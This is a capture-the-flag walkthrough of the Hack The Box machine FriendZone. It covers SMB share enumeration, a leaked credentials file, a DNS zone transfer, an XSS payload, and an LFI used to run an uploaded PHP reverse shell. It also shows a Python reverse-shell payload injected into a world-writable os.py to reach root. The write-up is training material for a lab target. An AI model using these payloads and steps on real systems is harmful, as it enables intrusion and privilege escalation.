# Hack The Box - FriendZone Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.123
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 08:38 EST
Nmap scan report for 10.10.10.123
Host is up (0.14s latency).
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/5%OT=21%CT=1%CU=35530%PV=Y%DS=2%DC=I%G=Y%TM=64049D71
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -39m55s, deviation: 1h09m16s, median: 3s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-03-05T13:47:22
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-03-05T15:47:22+02:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 564.52 seconds
```


Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ rustscan -a 10.10.10.123 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.123:21
Open 10.10.10.123:139
Open 10.10.10.123:22
Open 10.10.10.123:53
Open 10.10.10.123:80
Open 10.10.10.123:445
Open 10.10.10.123:443
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 21,139,22,53,80,445,443 10.10.10.123

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 08:41 EST
Initiating Ping Scan at 08:41
Scanning 10.10.10.123 [2 ports]
Completed Ping Scan at 08:41, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:41
Completed Parallel DNS resolution of 1 host. at 08:41, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:41
Scanning 10.10.10.123 [7 ports]
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Completed Connect Scan at 08:41, 0.23s elapsed (7 total ports)
Nmap scan report for 10.10.10.123
Host is up, received syn-ack (0.19s latency).
Scanned at 2023-03-05 08:41:20 EST for 1s

PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack
22/tcp  open  ssh          syn-ack
53/tcp  open  domain       syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
443/tcp open  https        syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

So, `nmap` and `rustscan` both found `7` open ports.
- port `21`: running `ftp vsftpd 3.0.3`
- port `22`: running `OpenSSH 7.6p1 Ubuntu 4`
- port `53`: running `ISC BIND 9.11.3–1ubuntu1.2 (DNS)`
- port `80` : running `Apache httpd 2.4.29`
- port `139` : running `Samba smbd 3.X - 4.X`
- port `145`: running `Samba smbd 4.7.6-Ubuntu`
- port `443`: running `Samba smbd 4.7.6`

There were few important things that I noticed from the nmap results.
1. FTP service on port 21 allowed anonymous login.
2. port 53 could be used to get the domain name lookup through `nslookup`.
3. port `80` & `443` showed different papge titles indicating a presence of virtual hosts routing configuration.
4. SMB services were detected on ports `145` & `443`

## Enumeration.
Since there was `SMB` on the machine, I started the enumeration process from there.

I used `smbmap` for a quick look at the shares and my permissions.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ smbmap -H 10.10.10.123                  
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

Using `smbclient` along with `-L` flag to list all the contents and `-N` flag for null session.

```
──(darshan㉿kali)-[~]
└─$ smbclient -N -L //10.10.10.123

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```

I noticed a comment on `Files` share that mentioned `/etc/Files` while `general` & `Development` also had almost similar comments. So, I decided to run the nmap script `smb-sum-shares.nse` scan.

```
┌──(darshan㉿kali)-[~]
└─$ nmap --script smb-enum-shares.nse -p445 10.10.10.123
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 09:48 EST
Nmap scan report for 10.10.10.123
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 31.79 seconds
                                   
```

Now, I decided to visit these shares to take a look at their contents. But, it was empty.

```
┌──(darshan㉿kali)-[~]
└─$ smbclient -N //10.10.10.123/Development  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar  6 09:49:09 2023
  ..                                  D        0  Tue Sep 13 10:56:24 2022

                3545824 blocks of size 1024. 1651404 blocks available
```

Then, I visited the `general` share. It had a single file, `creds.txt`. So, I decided to get that file on my machine and check it out.

```
┌──(darshan㉿kali)-[~]
└─$ smbclient -N //10.10.10.123/general    
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Tue Sep 13 10:56:24 2022
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                3545824 blocks of size 1024. 1651404 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

It contained admin's credentials.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ cat creds.txt                               
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

I didn't know where it would work, so I kept enumerating further.

Next, I visited the webpage on port `80` and found this page. I found this `friendzoneportal.red` domain and nothing else.

![frd-1](https://user-images.githubusercontent.com/87711310/223148180-75af8cb6-093e-4080-b0db-ce6717a6f502.png)

So, then, I decided to run `gobuster` on the domain after adding the domain to `/etc/hosts`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ gobuster dir -u http://friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php -t 20

===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://friendzone.red/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2023/03/06 10:11:04 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 293]
/wordpress            (Status: 301) [Size: 320] [--> http://friendzone.red/wordpress/]
/robots.txt           (Status: 200) [Size: 13]
===============================================
2019/02/05 15:33:59 Finished
===============================================
```

So, it found `wordpress` and `robots.txt`.

Visiting `robots.txt`, I found a sinlge word message which I suppose was just for a troll.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ curl http://friendzone.red/robots.txt
seriously ?!
```

Visiting the `/wordpress`, I found out that it was an empty directory.

![frd-2](https://user-images.githubusercontent.com/87711310/223151243-eed22ce1-f0bb-4914-bfe9-aed5b8e3e25f.png)

There was nothing on port `80`, so I decided to visit port `443`. This page was different from the `HTTP` site.

![frd-3](https://user-images.githubusercontent.com/87711310/223155824-ad5d5775-2d37-4fa5-93df-e17acffbc796.png)

There was nothing on the web-page, but when I checked out the source-code of the page, I found something.

![frd-4](https://user-images.githubusercontent.com/87711310/223159196-2c59f102-5312-4b65-9e8c-e61e74dfb184.png)

Visiting the `/js/js` directory, I found a wierd string.

![image](https://user-images.githubusercontent.com/87711310/223159460-715c4658-06dc-4573-b40d-cadb859788d0.png)

Looking at the source-code of the page, I found some comments.

![frd-4](https://user-images.githubusercontent.com/87711310/223159738-3ae8bac6-ccb2-4427-84de-566b148cd914.png)

This comment might be an indicator of DNS zone transfer and since I didnt knew about it much, I decided to google it out.

First, I used `nslookup` to look for the IP address.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ nslookup 10.10.10.123                               
** server can't find 123.10.10.10.in-addr.arpa: NXDOMAIN
```

I didn’t get anything. However, I had two possible domains from previous enumeration steps:
- `friendzone.red` from the nmap scan,
- `friendzoneportal.red` from the HTTP website

So, now, I decided to try a zone transfer on both domains. I googled the command for zone transfer.

#### # zone transfer command: 
```
host -l <domain-name> <dns_server-address>
```

So I decided to add both the domains in a text file.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ host -l friendzone.red 10.10.10.123 > zonetransfer.txt

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt 
```

Then I just ran `nslookup`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ nslookup             
> server 10.10.10.123
Default server: 10.10.10.123
Address: 10.10.10.123#53

```

You wont see any changes, but once you opne the `zonetransfer.txt` file, you'll see all the sub-domains.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ cat zonetransfer.txt 
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzone.red has IPv6 address ::1
friendzone.red name server localhost.
friendzone.red has address 127.0.0.1
administrator1.friendzone.red has address 127.0.0.1
hr.friendzone.red has address 127.0.0.1
uploads.friendzone.red has address 127.0.0.1
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

friendzoneportal.red has IPv6 address ::1
friendzoneportal.red name server localhost.
friendzoneportal.red has address 127.0.0.1
admin.friendzoneportal.red has address 127.0.0.1
files.friendzoneportal.red has address 127.0.0.1
imports.friendzoneportal.red has address 127.0.0.1
vpn.friendzoneportal.red has address 127.0.0.1

```

Now, I added all the domains/sub-doamains to the `/etc/hosts` file.

```
10.10.10.123 friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
```

So, now I started visiting each of these above mentioned sub-domains.

All the subdomains on `http` seem to go back to the same site. I’ll leave them for now.

For the sub-domains on `https`, I got 8 sub-domains to check out. MOst of them weren't useful. I've summarized them below.

- `hr.friendzone.red`	->  404 Not found
- `uploads.friendzone.red`  -> Fake upload site
- `friendzoneportal.red`  -> Text and gif of Michael Jackson eating popcorn.
- `admin.friendzoneportal.red`  ->  Has login form. Creds from SMB work, but on login, message says “Admin page is not developed yet !!! check for another one”
- `files.friendzoneportal.red`  -> 404 Not found
- `imports.friendzoneportal.red	`  -> 404 Not found
- `vpn.friendzoneportal.red` -> 404 Not found
- `administrator1.friendzone.red` ->  Has a valid looking login page.

Since, `administrator1.friendzone.red` was the only sub-domain looking valid and presented a login page, I decided to try and log into the site.

![frd-5](https://user-images.githubusercontent.com/87711310/223327203-fd0f5376-0d60-4d03-9d1e-09d0d83f9d3e.png)

I used the credentials found in the `creds.txt` file to try and log into the webpage and I was able to login. Upon logging in, I was displayed a message too.

![frd-6](https://user-images.githubusercontent.com/87711310/223327439-6fbcdbd8-3c3a-4295-8077-8875cfcbd505.png)

So visiting the `/dashboard.php`, I found this page.

![frd-7](https://user-images.githubusercontent.com/87711310/223327649-53330f09-3e8a-4156-af06-4716e5edcb99.png)

If I add the suggested parameters to the url
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
```

![frd-8](https://user-images.githubusercontent.com/87711310/223329762-4fb370f9-34b1-4c8b-b175-d3c59d6551e5.png)

I got a `Final Access timestamp number` which I put it in the url and I no longer get  a "Final Access timestamp…" message

![frd-9](https://user-images.githubusercontent.com/87711310/223329956-d8cf9a17-fe00-40f1-862c-df2515fe5681.png)

At this point, I decided to run `gobuster` to enumerate directories of `https://administrator1.friendzone.red`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ gobuster dir -u https://administrator1.friendzone.red/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 200

===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://administrator1.friendzone.red/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/07 00:40:04 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 309]
/images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
/login.php            (Status: 200) [Size: 7]
/dashboard.php        (Status: 200) [Size: 101]
/timestamp.php        (Status: 200) [Size: 36]
/.php                 (Status: 403) [Size: 309]
Progress: 175328 / 175330 (100.00%)
===============================================================
2023/03/07 00:44:52 Finished
===============================================================
```

So, gobuster found `timestamp.php` and I checked it out by using `curl`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ curl -k https://administrator1.friendzone.red/timestamp.php
Final Access timestamp is 1678171468   
```

## Gaining a Foothold.

Based on the parameters used for the `administrator1.friendzone.red`, there's a likely local file include (LFI) on this page. Both the parameters, `image_id` and `pagename` seemed vulnerable.

Since the `image_id` has a full file name such as `a.jpg`, I tried giving it a php page, which it would load if the file is being shown using `include` in php. Unfortunately, it just shows a broken image:

![frd-10](https://user-images.githubusercontent.com/87711310/223332247-24fc247a-8eb3-4059-95a6-b834f9222f81.png)

Looking at the source, I see `<img src='images/timestamp.php'>`. I could play with `XSS` here, and see if I can get it to load a script. For example, if I set `image_id=' onerror='javascript: alert("XXS HERE");`, I get a pop-up:

![frd-11](https://user-images.githubusercontent.com/87711310/223332541-45d049ff-f4c2-4d10-8a11-10e6dae836bf.png)

The source explains it: 

```
<img src='images/' onerror='javascript: alert("XXS HERE");'>
```

Now, if this were a public site, I could close off the image tag and add an `iframe` with a malicious site (say, a login dialog), and then phish with the url coming from a trusted site. But for now, I’ll turn to the second parameter.

I can also try to reference pages outside this directory. On the uploads subdomain, there’s an `upload.php`

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ curl -k https://uploads.friendzone.red/upload.php
WHAT ARE YOU TRYING TO DO HOOOOOOMAN ! 
```

So now, I decided to try and check if I was able to upload a php file and try to get back a reverse shell.

So, firstly, i created a simple `test.php` script that outputs the string `It’s working!` on the page.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ cat test.php                                     
<?php
echo "It's working!!!"
?>
```

Then, I logged into the `Developmemnt` share using the `smbclient` and put the `test.php` file into it using the `put` command.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> put test.php
putting file test.php as \test.php (0.1 kb/s) (average 0.1 kb/s)
```

Now, all I had to do was to visit the site and check for the LFI to run this script.

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test
```

It is indeed working!

![frd-12](https://user-images.githubusercontent.com/87711310/223334293-b0ecab28-18f6-4510-b222-c3a05dbffca4.png)

So now, I decided to put in a reverse shell. I grabbed the reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and made the necessary changes to it.

Started a netcat listener

```
nc -lvnp 999
```

Uploaded the script to the `Development` share.

```
smb: \> put php-rev-shell.php
putting file php-rev-shell.php as \php-rev-shell.php (14.5 kb/s) (average 7.3 kb/s)
```

Executed the reverse shell script from the website.

```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-rev-shell
```

And I got back a shell.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ nc -lvnp 9999                                       
listening on [any] 9999 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.123] 50228
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 08:07:49 up  1:07,  0 users,  load average: 0.00, 0.07, 0.74
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Upgraded it to a better shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Grabbing the user flag.

```
www-data@FriendZone:/$ cd home
cd home
www-data@FriendZone:/home$ ls
ls
friend
www-data@FriendZone:/home$ cd friend
cd friend
www-data@FriendZone:/home/friend$ ls
ls
user.txt
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
[REDACTED]
```

## Privilege Escalation.
Now, that I `rwx` privilege on the `/etc/Development` directory as `www-data`, I decided to upload `Linpeas` script in the Development share.

```
smb: \> put linpeas.sh
putting file linpeas.sh as \linpeas.sh (650.1 kb/s) (average 650.1 kb/s)
```

I navigated to the `/etc/Development` directory on the target machine, gave the script execute permissions and ran it.

```
www-data@FriendZone:/home/friend$ cd /etc/Development
cd /etc/Development
www-data@FriendZone:/etc/Development$ chmod +x linpeas.sh
chmod +x linpeas.sh
chmod: changing permissions of 'linpeas.sh': Operation not permitted
```

I didn't have the permission to make the script executable to I decided to copy it to the `/tmp` directory.

```
www-data@FriendZone:/tmp$ cp /etc/Development/linpeas.sh .
cp /etc/Development/linpeas.sh .
www-data@FriendZone:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@FriendZone:/tmp$ ./linpeas.sh
./linpeas.sh
```

The results from linpeas weren't that interesting, so I decided to try out `pspy`

uploaded the scipt to `/etc/Development` using the `smbclient`:

```
smb: \> put pspy32
putting file pspy32 as \pspy32 (1102.1 kb/s) (average 1102.1 kb/s)
```

Copied the script to `/tmp`, gave it execute permission and ran it.

```
www-data@FriendZone:/tmp$ cp /etc/Development/pspy32 .
cp /etc/Development/pspy32 .
www-data@FriendZone:/tmp$ chmod +x pspy32
chmod +x pspy32
www-data@FriendZone:/tmp$ ls
ls
linpeas.sh  php-rev-shell.php  pspy32  pspy64s
www-data@FriendZone:/tmp$ ./pspy32
./pspy32
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
```

I found a process that was constantly popping up after a regular interval.

```
2023/03/07 08:44:01 CMD: UID=0     PID=16370  | /usr/bin/python /opt/server_admin/reporter.py 
2023/03/07 08:44:01 CMD: UID=0     PID=16369  | /bin/sh -c /opt/server_admin/reporter.py 
```

It seemed that the `reporter.py` script is getting executed every couple of minutes as a scheduled task. So, I viewed the permissions I had on that file.


![frd-13](https://user-images.githubusercontent.com/87711310/223345909-333c9aa9-6194-4dfe-a79b-a5d0924b20ba.png)

I only had read permission on the file. So, I looked at the contents of the file.

```
#!/usr/bin/pythonimport osto_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"print "[+] Trying to send email to %s"%to_address#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''#os.system(command)# I need to edit the script later
# Sam ~ python developer
```

Most of the script is commented out so there isn’t much to do there. It does import the os module. Maybe I had to hijack that or something.

```
www-data@FriendZone:/$ locate os.py
locate os.py
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
/usr/lib/python2.7/encodings/palmos.py
/usr/lib/python2.7/encodings/palmos.pyc
/usr/lib/python3/dist-packages/LanguageSelector/macros.py
/usr/lib/python3.6/os.py
/usr/lib/python3.6/encodings/palmos.py
```

Visiting the `/python2.7` directory and checking out the permissions of `os.py`

```
www-data@FriendZone:/$ cd /usr/lib/python2.7
cd /usr/lib/python2.7
www-data@FriendZone:/usr/lib/python2.7$ ls -la | grep os.py
ls -la | grep os.py
-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
```

I had `rwx` privileges on the os.py module! This is obviously a `security misconfiguration`. As a non-privileged user, I should only have read access to the script. If I add a reverse shell to the script and wait for the root owned scheduled task to run, I’ll get back a reverse shell with root privileges!

The most common case for this kind of hijack is finding the directory containing the python script writable. In that case, I could drop an `os.py` in next to `reporter.py` and it would load there before checking `/usr/lib/python2.7/`. In this case, I actually can’t write to `/opt/server_admin/`. But I can write directly to the normal version of this module.

I’ll open the file in vi, and go to the bottom. There, I’ll add a shell to myself:

```
...[snip]...
def _pickle_statvfs_result(sr):
    (type, args) = sr.__reduce__()
    return (_make_statvfs_result, args)

try:
    _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
                     _make_statvfs_result)
except NameError: # statvfs_result may not exist
    pass

import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.47",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

It’s a standard python reverse shell, except that instead of `os.dup2()`, I just write `dup2()`. That’s because I’m in the os module right now. It actually should still work if you just import os, but I removed it as it’s not needed.

I saved that and waited for the system to run the `reporter.py` file and after a while I got back the `root` shell!!!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Friendzone]
└─$ nc -lvnp 443                                        
listening on [any] 443 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.123] 50130
root@FriendZone:~# whoami
whoami
root
```

Grabbing the root flag.

```
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
[REDACTED]
```
